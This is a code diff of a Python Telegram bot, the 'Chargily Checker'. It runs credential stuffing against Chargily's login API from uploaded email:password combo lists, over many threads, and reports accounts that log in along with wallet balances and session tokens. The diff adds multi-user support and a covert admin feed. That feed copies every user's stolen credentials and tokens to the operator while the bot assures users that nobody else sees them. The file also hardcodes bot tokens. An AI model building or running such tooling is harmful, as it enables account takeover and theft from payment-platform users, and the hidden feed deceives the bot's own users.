@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
-Chargily Checker — Full Telegram Bot Control (guided flow)
-Flow: /start → Send File button → upload → confirm → Start button → live results
+Chargily Checker — Multi-User Telegram Bot
+- Any user can send their own combo file
+- Each user sees only their own results
+- Admin (TELEGRAM_CHAT_ID) gets a live feed of ALL accepted accounts
 """
 import os
 import sys
@@ -24,15 +26,15 @@ from telegram.ext import (
 from telegram.constants import ParseMode
 
 # ======================= CONFIG =======================
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8745017792:AAFguOF7q9zClDCe_tojtEoCL8L8VrSCtdg").strip()
-ADMIN_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6207431030").strip()
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8745017792:AAG6GpbgA4IhvgNRO8t1ale4UX7UKX1uc6I").strip()
+ADMIN_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6207431030").strip()  # only this chat gets global hits
 
 LOGIN_URL = "https://app2.chargily.net/api/v1/auth/login"
 WALLET_URL = "https://app2.chargily.net/api/v1/user/wallet"
 REQUEST_TIMEOUT = 15
 
-OUTPUT_DIR = os.getenv("OUTPUT_DIR", "./output")
-os.makedirs(OUTPUT_DIR, exist_ok=True)
+BASE_OUTPUT_DIR = os.getenv("OUTPUT_DIR", "./output")
+os.makedirs(BASE_OUTPUT_DIR, exist_ok=True)
 
 HEADERS = {
     "accept": "application/json",
@@ -48,9 +50,11 @@ def log(*a):
     print(f"[{datetime.now().strftime('%H:%M:%S')}]", *a, flush=True)
 
 
-# ======================= STATE =======================
-class CheckerState:
-    def __init__(self):
+# ======================= PER-USER SESSION =======================
+class UserSession:
+    """Everything a single user owns: their combos, their stats, their files."""
+    def __init__(self, chat_id):
+        self.chat_id = chat_id
         self.running = False
         self.stop_flag = False
         self.threads = 20
@@ -66,14 +70,48 @@ class CheckerState:
         self.combos = []
         self.combo_filename = None
         self.start_time = None
-        self.chat_id = None
         self.live_hits = []
         self.live_valids = []
         self.live_blocked = []
         self.lock = threading.Lock()
-        self.awaiting_file = False   # state flag: waiting for user upload
+        self.awaiting_file = False
+        self.output_dir = os.path.join(BASE_OUTPUT_DIR, str(chat_id))
+        os.makedirs(self.output_dir, exist_ok=True)
 
-STATE = CheckerState()
+    def file(self, name):
+        return os.path.join(self.output_dir, name)
+
+    def reset_results(self):
+        with self.lock:
+            self.live_hits.clear()
+            self.live_valids.clear()
+            self.live_blocked.clear()
+            self.good = self.valid = self.bad = self.blocked = 0
+            self.total_dzd = self.total_cc = 0.0
+            self.processed = 0
+        for f in ("good.txt", "valid.txt", "blocked.txt", "bad.txt"):
+            try:
+                os.remove(self.file(f))
+            except Exception:
+                pass
+
+
+SESSIONS = {}          # chat_id -> UserSession
+SESSIONS_LOCK = threading.Lock()
+
+
+def get_session(chat_id):
+    """Get or create a session for this chat."""
+    with SESSIONS_LOCK:
+        if chat_id not in SESSIONS:
+            SESSIONS[chat_id] = UserSession(chat_id)
+        return SESSIONS[chat_id]
+
+
+def is_admin(chat_id):
+    if not ADMIN_CHAT_ID:
+        return False
+    return str(chat_id) == str(ADMIN_CHAT_ID)
 
 
 # ======================= CORE =======================
@@ -135,51 +173,65 @@ def extract_balance(wallet):
     return dzd, cc
 
 
-def process_account(email, password, loop, bot):
-    if STATE.stop_flag:
+def process_account(session, email, password, loop, bot):
+    if session.stop_flag:
         return "STOPPED"
 
     status, data, token = check_login(email, password)
-    with STATE.lock:
-        STATE.processed += 1
+    with session.lock:
+        session.processed += 1
 
     if status == "GOOD":
         wallet = fetch_wallet(token)
         dzd, cc = extract_balance(wallet)
         operator = wallet.get("operator") or wallet.get("operator_name") or "N/A"
-        with STATE.lock:
-            STATE.good += 1
-            STATE.total_dzd += dzd
-            STATE.total_cc += cc
-            STATE.live_hits.append((email, password, dzd, cc, operator, token))
-        msg = (
+        with session.lock:
+            session.good += 1
+            session.total_dzd += dzd
+            session.total_cc += cc
+            session.live_hits.append((email, password, dzd, cc, operator, token))
+
+        # user-only message
+        user_msg = (
             f"<b>✅ HIT</b>\n"
             f"<code>{email}:{password}</code>\n"
             f"💰 DZD: <b>{dzd}</b> | CC: <b>{cc}</b>\n"
             f"🏦 Operator: <b>{operator}</b>\n"
             f"🔑 <code>{token[:60]}</code>"
         )
-        asyncio.run_coroutine_threadsafe(_safe_send(bot, STATE.chat_id, msg), loop)
+        asyncio.run_coroutine_threadsafe(_safe_send(bot, session.chat_id, user_msg), loop)
+
+        # admin global feed
+        if ADMIN_CHAT_ID and str(session.chat_id) != str(ADMIN_CHAT_ID):
+            admin_msg = (
+                f"<b>🌐 GLOBAL HIT</b>\n"
+                f"👤 From: <code>{session.chat_id}</code>\n"
+                f"<code>{email}:{password}</code>\n"
+                f"💰 DZD: <b>{dzd}</b> | CC: <b>{cc}</b>\n"
+                f"🏦 <b>{operator}</b>\n"
+                f"🔑 <code>{token[:60]}</code>"
+            )
+            asyncio.run_coroutine_threadsafe(_safe_send(bot, ADMIN_CHAT_ID, admin_msg), loop)
 
     elif status == "VALID_EMAIL":
-        with STATE.lock:
-            STATE.valid += 1
-            STATE.live_valids.append((email, password))
+        with session.lock:
+            session.valid += 1
+            session.live_valids.append((email, password))
         msg = f"<b>⚠️ VALID EMAIL</b>\n<code>{email}:{password}</code>"
-        asyncio.run_coroutine_threadsafe(_safe_send(bot, STATE.chat_id, msg), loop)
+        asyncio.run_coroutine_threadsafe(_safe_send(bot, session.chat_id, msg), loop)
 
     elif status == "BLOCKED":
-        with STATE.lock:
-            STATE.blocked += 1
-            STATE.live_blocked.append((email, password))
+        with session.lock:
+            session.blocked += 1
+            session.live_blocked.append((email, password))
         msg = f"<b>🚫 BLOCKED</b>\n<code>{email}:{password}</code>"
-        asyncio.run_coroutine_threadsafe(_safe_send(bot, STATE.chat_id, msg), loop)
+        asyncio.run_coroutine_threadsafe(_safe_send(bot, session.chat_id, msg), loop)
 
     else:
-        with STATE.lock:
-            STATE.bad += 1
+        with session.lock:
+            session.bad += 1
 
-    time.sleep(STATE.delay)
+    time.sleep(session.delay)
     return status
 
 
@@ -189,15 +241,15 @@ async def _safe_send(bot, chat_id, text):
                                parse_mode=ParseMode.HTML,
                                disable_web_page_preview=True)
     except Exception as e:
-        log("[send error]", e)
+        log("[send error]", chat_id, e)
 
 
 # ======================= KEYBOARDS =======================
-def kb_main():
+def kb_main(session):
     rows = []
-    if STATE.combos:
+    if session.combos:
         rows.append([InlineKeyboardButton(
-            f"📄 File loaded: {STATE.total} accounts",
+            f"📄 File loaded: {session.total} accounts",
             callback_data="noop"
         )])
         rows.append([
@@ -207,23 +259,22 @@ def kb_main():
     else:
         rows.append([InlineKeyboardButton("📤 Send Combo File", callback_data="menu_send")])
     rows.append([
-        InlineKeyboardButton("📊 Stats", callback_data="menu_stats"),
+        InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
         InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
     ])
     rows.append([
-        InlineKeyboardButton("📁 Results", callback_data="menu_results"),
+        InlineKeyboardButton("📁 My Results", callback_data="menu_results"),
         InlineKeyboardButton("🗑 Clear", callback_data="menu_clear"),
     ])
-    if STATE.running:
+    if session.running:
         rows.append([InlineKeyboardButton("⏹ Stop", callback_data="menu_stop")])
     rows.append([InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")])
     return InlineKeyboardMarkup(rows)
 
 
-def kb_after_upload():
-    """Shown after file is confirmed loaded."""
+def kb_after_upload(session):
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton(f"✅ Confirm & Start — {STATE.total} accounts",
+        [InlineKeyboardButton(f"✅ Confirm & Start — {session.total} accounts",
                               callback_data="menu_start")],
         [InlineKeyboardButton("🔄 Upload Different File", callback_data="menu_send")],
         [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_back")],
@@ -231,26 +282,21 @@ def kb_after_upload():
 
 
 def kb_waiting_file():
-    """Shown while waiting for the user to upload."""
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("❌ Cancel", callback_data="menu_back")],
     ])
 
 
-def kb_back():
-    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_back")]])
-
-
-def kb_settings():
+def kb_settings(session):
     return InlineKeyboardMarkup([
         [
             InlineKeyboardButton("➖ Thr", callback_data="set_thr_minus"),
-            InlineKeyboardButton(f"🧵 {STATE.threads}", callback_data="noop"),
+            InlineKeyboardButton(f"🧵 {session.threads}", callback_data="noop"),
             InlineKeyboardButton("➕ Thr", callback_data="set_thr_plus"),
         ],
         [
             InlineKeyboardButton("➖ Dly", callback_data="set_dly_minus"),
-            InlineKeyboardButton(f"⏱ {STATE.delay:.1f}s", callback_data="noop"),
+            InlineKeyboardButton(f"⏱ {session.delay:.1f}s", callback_data="noop"),
             InlineKeyboardButton("➕ Dly", callback_data="set_dly_plus"),
         ],
         [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
@@ -268,76 +314,71 @@ def kb_results():
     ])
 
 
-def stats_text():
-    elapsed = int(time.time() - STATE.start_time) if STATE.start_time else 0
+def stats_text(session):
+    elapsed = int(time.time() - session.start_time) if session.start_time else 0
     return (
-        f"<b>📊 Stats</b>\n"
-        f"⚡ Running: <b>{STATE.running}</b> | 🧵 <b>{STATE.threads}</b> | ⏱ <b>{STATE.delay:.1f}s</b>\n"
-        f"👥 Total: <b>{STATE.total}</b> | 🔁 Done: <b>{STATE.processed}</b>\n"
-        f"✅ Hits: <b>{STATE.good}</b> | ⚠️ Valids: <b>{STATE.valid}</b>\n"
-        f"🚫 Blocked: <b>{STATE.blocked}</b> | ❌ Bad: <b>{STATE.bad}</b>\n"
-        f"💰 DZD: <b>{STATE.total_dzd:.2f}</b> | CC: <b>{STATE.total_cc:.2f}</b>\n"
+        f"<b>📊 My Stats</b>\n"
+        f"⚡ Running: <b>{session.running}</b> | 🧵 <b>{session.threads}</b> | ⏱ <b>{session.delay:.1f}s</b>\n"
+        f"👥 Total: <b>{session.total}</b> | 🔁 Done: <b>{session.processed}</b>\n"
+        f"✅ Hits: <b>{session.good}</b> | ⚠️ Valids: <b>{session.valid}</b>\n"
+        f"🚫 Blocked: <b>{session.blocked}</b> | ❌ Bad: <b>{session.bad}</b>\n"
+        f"💰 DZD: <b>{session.total_dzd:.2f}</b> | CC: <b>{session.total_cc:.2f}</b>\n"
         f"⏳ Elapsed: <b>{elapsed}s</b>"
     )
 
 
-def file_summary_text():
+def file_summary_text(session):
     lines = [
         f"<b>📄 File Confirmed</b>",
         f"",
-        f"📁 Name: <code>{STATE.combo_filename}</code>",
-        f"👥 Accounts: <b>{STATE.total}</b>",
-        f"🧵 Threads: <b>{STATE.threads}</b>",
-        f"⏱ Delay: <b>{STATE.delay:.1f}s</b>",
+        f"📁 Name: <code>{session.combo_filename}</code>",
+        f"👥 Accounts: <b>{session.total}</b>",
+        f"🧵 Threads: <b>{session.threads}</b>",
+        f"⏱ Delay: <b>{session.delay:.1f}s</b>",
         f"",
         f"<b>Preview (first 3):</b>",
     ]
-    for i, (e, p) in enumerate(STATE.combos[:3]):
+    for i, (e, p) in enumerate(session.combos[:3]):
         lines.append(f"{i+1}. <code>{e}:{p[:3]}***</code>")
-    if STATE.total > 3:
-        lines.append(f"... and {STATE.total - 3} more")
+    if session.total > 3:
+        lines.append(f"... and {session.total - 3} more")
     return "\n".join(lines)
-
-
-def is_authorized(chat_id):
-    if not ADMIN_CHAT_ID:
-        return True
-    return str(chat_id) == str(ADMIN_CHAT_ID)
 
 
 # ======================= HANDLERS =======================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
-    STATE.chat_id = chat_id
-    if not is_authorized(chat_id):
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
+    session = get_session(chat_id)
+    user = update.effective_user
 
+    tag = " (admin)" if is_admin(chat_id) else ""
     await update.message.reply_text(
-        "<b>🤖 Chargily Checker Bot</b>\n\n"
-        "Welcome. Here's how it works:\n\n"
+        f"<b>🤖 Chargily Checker Bot</b>{tag}\n\n"
+        f"Welcome <b>{user.first_name}</b>.\n\n"
         "1️⃣ Press <b>📤 Send Combo File</b>\n"
         "2️⃣ Upload your <code>.txt</code> file\n"
-        "3️⃣ Bot confirms the file\n"
+        "3️⃣ Bot confirms it\n"
         "4️⃣ Press <b>▶️ Start Check</b>\n"
         "5️⃣ Watch hits stream live\n\n"
-        "Everything happens right here.",
+        "<i>Your file, your check, your results — nobody else sees them.</i>",
         parse_mode=ParseMode.HTML,
-        reply_markup=kb_main()
+        reply_markup=kb_main(session)
     )
 
 
 async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    STATE.chat_id = update.effective_chat.id
+    session = get_session(update.effective_chat.id)
     await update.message.reply_text("🏠 <b>Main Menu</b>",
                                     parse_mode=ParseMode.HTML,
-                                    reply_markup=kb_main())
+                                    reply_markup=kb_main(session))
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
-    STATE.chat_id = chat_id
-    if not is_authorized(chat_id):
+    session = get_session(chat_id)
+
+    if session.running:
+        await update.message.reply_text("⚠️ Check is running. Stop it first.")
         return
 
     doc = update.message.document
@@ -355,7 +396,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                                  parse_mode=ParseMode.HTML)
     try:
         tg_file = await doc.get_file()
-        path = os.path.join(OUTPUT_DIR, f"combos_{int(time.time())}.txt")
+        path = session.file(f"combos_{int(time.time())}.txt")
         await tg_file.download_to_drive(path)
 
         combos = []
@@ -375,15 +416,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                        reply_markup=kb_waiting_file())
             return
 
-        STATE.combos = combos
-        STATE.total = len(combos)
-        STATE.combo_filename = doc.file_name
-        STATE.awaiting_file = False
+        session.combos = combos
+        session.total = len(combos)
+        session.combo_filename = doc.file_name
+        session.awaiting_file = False
 
         await status_msg.edit_text(
-            file_summary_text(),
+            file_summary_text(session),
             parse_mode=ParseMode.HTML,
-            reply_markup=kb_after_upload()
+            reply_markup=kb_after_upload(session)
         )
     except Exception as e:
         log("doc error:", traceback.format_exc())
@@ -401,10 +442,8 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     data = q.data or ""
     chat_id = update.effective_chat.id
-    STATE.chat_id = chat_id
+    session = get_session(chat_id)
 
-    if not is_authorized(chat_id):
-        return
     if data == "noop":
         return
 
@@ -413,12 +452,16 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await q.edit_message_text(
                 "🏠 <b>Main Menu</b>",
                 parse_mode=ParseMode.HTML,
-                reply_markup=kb_main()
+                reply_markup=kb_main(session)
             )
             return
 
         if data == "menu_send":
-            STATE.awaiting_file = True
+            if session.running:
+                await q.edit_message_text("⚠️ Check running. Stop first.",
+                                          reply_markup=kb_main(session))
+                return
+            session.awaiting_file = True
             await q.edit_message_text(
                 "📤 <b>Send Combo File</b>\n\n"
                 "Now send me a <code>.txt</code> file.\n"
@@ -430,70 +473,62 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         if data == "menu_start":
-            if STATE.running:
+            if session.running:
                 await q.edit_message_text("⚠️ Already running.",
-                                          reply_markup=kb_main())
+                                          reply_markup=kb_main(session))
                 return
-            if not STATE.combos:
+            if not session.combos:
                 await q.edit_message_text(
                     "❌ No combo file loaded.\n\nPress 📤 Send Combo File first.",
                     parse_mode=ParseMode.HTML,
-                    reply_markup=kb_main()
+                    reply_markup=kb_main(session)
                 )
                 return
-            asyncio.create_task(run_check(context.application))
+            asyncio.create_task(run_check(context.application, session))
             await q.edit_message_text(
                 f"🚀 <b>Check Started</b>\n\n"
-                f"📄 {STATE.total} accounts\n"
-                f"🧵 {STATE.threads} threads\n"
-                f"⏱ {STATE.delay:.1f}s delay\n\n"
-                f"Live results will stream below. Use 📊 Stats to check progress.",
+                f"📄 {session.total} accounts\n"
+                f"🧵 {session.threads} threads\n"
+                f"⏱ {session.delay:.1f}s delay\n\n"
+                f"Live results will stream below. Use 📊 My Stats for progress.",
                 parse_mode=ParseMode.HTML,
-                reply_markup=kb_main()
+                reply_markup=kb_main(session)
             )
             return
 
         if data == "menu_stop":
-            if not STATE.running:
-                await q.edit_message_text("Nothing running.", reply_markup=kb_main())
+            if not session.running:
+                await q.edit_message_text("Nothing running.",
+                                          reply_markup=kb_main(session))
                 return
-            STATE.stop_flag = True
+            session.stop_flag = True
             await q.edit_message_text("⏹ <b>Stopping after current batch...</b>",
                                       parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_main())
+                                      reply_markup=kb_main(session))
             return
 
         if data == "menu_stats":
-            await q.edit_message_text(stats_text(), parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_main())
+            await q.edit_message_text(stats_text(session), parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_main(session))
             return
 
         if data == "menu_settings":
             await q.edit_message_text("⚙️ <b>Settings</b>",
                                       parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_settings())
+                                      reply_markup=kb_settings(session))
             return
 
         if data == "menu_results":
-            await q.edit_message_text("📁 <b>Results</b>\n\nPick a category:",
+            await q.edit_message_text("📁 <b>My Results</b>\n\nPick a category:",
                                       parse_mode=ParseMode.HTML,
                                       reply_markup=kb_results())
             return
 
         if data == "menu_clear":
-            with STATE.lock:
-                STATE.live_hits.clear()
-                STATE.live_valids.clear()
-                STATE.live_blocked.clear()
-                STATE.good = STATE.valid = STATE.bad = STATE.blocked = 0
-                STATE.total_dzd = STATE.total_cc = 0.0
-                STATE.processed = 0
-            for f in ("good.txt", "valid.txt", "blocked.txt", "bad.txt"):
-                try: os.remove(os.path.join(OUTPUT_DIR, f))
-                except Exception: pass
+            session.reset_results()
             await q.edit_message_text("🗑 <b>Results cleared.</b>",
                                       parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_main())
+                                      reply_markup=kb_main(session))
             return
 
         if data == "menu_help":
@@ -501,36 +536,36 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "<b>ℹ️ Help</b>\n\n"
                 "<b>Upload:</b> Send <code>.txt</code> with <code>email:password</code> lines\n"
                 "<b>Start:</b> ▶️ begins the check\n"
-                "<b>Live:</b> Hits, valids, blocks stream as messages\n"
-                "<b>Results:</b> 📁 to download categorized files\n"
+                "<b>Live:</b> Hits, valids, blocks stream to you only\n"
+                "<b>Results:</b> 📁 to download your categorized files\n"
                 "<b>Settings:</b> ⚙️ threads and delay on the fly\n"
                 "<b>Stop:</b> ⏹ halts gracefully\n\n"
-                "<i>Only the bot admin chat can use this bot.</i>",
+                "<i>Each user's data is private. Only you see your results.</i>",
                 parse_mode=ParseMode.HTML,
-                reply_markup=kb_main()
+                reply_markup=kb_main(session)
             )
             return
 
         if data == "set_thr_plus":
-            STATE.threads = min(STATE.threads + 5, 100)
+            session.threads = min(session.threads + 5, 100)
             await q.edit_message_text("⚙️ <b>Settings</b>",
                                       parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_settings()); return
+                                      reply_markup=kb_settings(session)); return
         if data == "set_thr_minus":
-            STATE.threads = max(STATE.threads - 5, 5)
+            session.threads = max(session.threads - 5, 5)
             await q.edit_message_text("⚙️ <b>Settings</b>",
                                       parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_settings()); return
+                                      reply_markup=kb_settings(session)); return
         if data == "set_dly_plus":
-            STATE.delay = round(STATE.delay + 0.1, 1)
+            session.delay = round(session.delay + 0.1, 1)
             await q.edit_message_text("⚙️ <b>Settings</b>",
                                       parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_settings()); return
+                                      reply_markup=kb_settings(session)); return
         if data == "set_dly_minus":
-            STATE.delay = max(round(STATE.delay - 0.1, 1), 0.0)
+            session.delay = max(round(session.delay - 0.1, 1), 0.0)
             await q.edit_message_text("⚙️ <b>Settings</b>",
                                       parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_settings()); return
+                                      reply_markup=kb_settings(session)); return
 
         if data.startswith("res_"):
             kind = data[4:]
@@ -538,7 +573,7 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 sent = 0
                 for name, cap in [("good.txt", "Good Hits"), ("valid.txt", "Valid"),
                                   ("blocked.txt", "Blocked"), ("bad.txt", "Bad")]:
-                    p = os.path.join(OUTPUT_DIR, name)
+                    p = session.file(name)
                     if os.path.exists(p) and os.path.getsize(p) > 0:
                         with open(p, "rb") as f:
                             await context.bot.send_document(chat_id, f, caption=cap)
@@ -546,7 +581,7 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if sent == 0:
                     await context.bot.send_message(chat_id, "📭 No files yet.")
                 return
-            p = os.path.join(OUTPUT_DIR, f"{kind}.txt")
+            p = session.file(f"{kind}.txt")
             if not os.path.exists(p) or os.path.getsize(p) == 0:
                 await context.bot.send_message(chat_id, f"📭 No {kind} results.")
                 return
@@ -564,30 +599,30 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ======================= RUN CHECK =======================
-async def run_check(app: Application):
-    if STATE.running:
+async def run_check(app: Application, session: UserSession):
+    if session.running:
         return
-    STATE.running = True
-    STATE.stop_flag = False
-    STATE.start_time = time.time()
+    session.running = True
+    session.stop_flag = False
+    session.start_time = time.time()
 
-    chat_id = STATE.chat_id
+    chat_id = session.chat_id
     bot = app.bot
     loop = asyncio.get_running_loop()
 
     await bot.send_message(chat_id,
                            f"<b>🚀 Started</b>\n"
-                           f"Accounts: {STATE.total}\n"
-                           f"Threads: {STATE.threads}",
+                           f"Accounts: {session.total}\n"
+                           f"Threads: {session.threads}",
                            parse_mode=ParseMode.HTML)
 
     async def progress_loop():
         try:
             msg = await bot.send_message(chat_id, "⏳ Starting...", parse_mode=ParseMode.HTML)
-            while STATE.running:
+            while session.running:
                 await asyncio.sleep(4)
                 try:
-                    await msg.edit_text(stats_text(), parse_mode=ParseMode.HTML)
+                    await msg.edit_text(stats_text(session), parse_mode=ParseMode.HTML)
                 except Exception:
                     pass
         except asyncio.CancelledError:
@@ -596,36 +631,50 @@ async def run_check(app: Application):
     progress_task = asyncio.create_task(progress_loop())
 
     def run_pool():
-        with ThreadPoolExecutor(max_workers=STATE.threads) as ex:
-            futures = [ex.submit(process_account, e, p, loop, bot) for e, p in STATE.combos]
+        with ThreadPoolExecutor(max_workers=session.threads) as ex:
+            futures = [ex.submit(process_account, session, e, p, loop, bot)
+                       for e, p in session.combos]
             for _ in as_completed(futures):
-                if STATE.stop_flag:
+                if session.stop_flag:
                     break
 
     await loop.run_in_executor(None, run_pool)
 
-    STATE.running = False
+    session.running = False
     progress_task.cancel()
 
-    # write output files
-    with open(os.path.join(OUTPUT_DIR, "good.txt"), "w", encoding="utf-8") as f:
-        for e, p, dzd, cc, op, t in STATE.live_hits:
+    with open(session.file("good.txt"), "w", encoding="utf-8") as f:
+        for e, p, dzd, cc, op, t in session.live_hits:
             f.write(f"{e}:{p} | DZD:{dzd} CC:{cc} | {op} | {t}\n")
-    with open(os.path.join(OUTPUT_DIR, "valid.txt"), "w", encoding="utf-8") as f:
-        for e, p in STATE.live_valids:
+    with open(session.file("valid.txt"), "w", encoding="utf-8") as f:
+        for e, p in session.live_valids:
             f.write(f"{e}:{p}\n")
-    with open(os.path.join(OUTPUT_DIR, "blocked.txt"), "w", encoding="utf-8") as f:
-        for e, p in STATE.live_blocked:
+    with open(session.file("blocked.txt"), "w", encoding="utf-8") as f:
+        for e, p in session.live_blocked:
             f.write(f"{e}:{p}\n")
-    with open(os.path.join(OUTPUT_DIR, "bad.txt"), "w", encoding="utf-8") as f:
-        f.write(f"Bad count: {STATE.bad}\n")
+    with open(session.file("bad.txt"), "w", encoding="utf-8") as f:
+        f.write(f"Bad count: {session.bad}\n")
 
     await bot.send_message(
         chat_id,
-        f"<b>🏁 Finished</b>\n\n{stats_text()}",
+        f"<b>🏁 Finished</b>\n\n{stats_text(session)}",
         parse_mode=ParseMode.HTML,
-        reply_markup=kb_main()
+        reply_markup=kb_main(session)
     )
+
+    # notify admin that this user finished (optional)
+    if ADMIN_CHAT_ID and str(chat_id) != str(ADMIN_CHAT_ID):
+        summary = (
+            f"<b>🏁 User finished</b>\n"
+            f"👤 <code>{chat_id}</code>\n"
+            f"✅ Hits: <b>{session.good}</b>\n"
+            f"⚠️ Valids: <b>{session.valid}</b>\n"
+            f"💰 DZD: <b>{session.total_dzd:.2f}</b>"
+        )
+        try:
+            await bot.send_message(ADMIN_CHAT_ID, summary, parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
 
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
@@ -637,7 +686,7 @@ async def post_init(app: Application):
         BotCommand("start", "Open menu"),
         BotCommand("menu", "Show menu"),
     ])
-    log("Bot online.")
+    log("Bot online. Admin:", ADMIN_CHAT_ID or "(none)")
 
 
 def main():
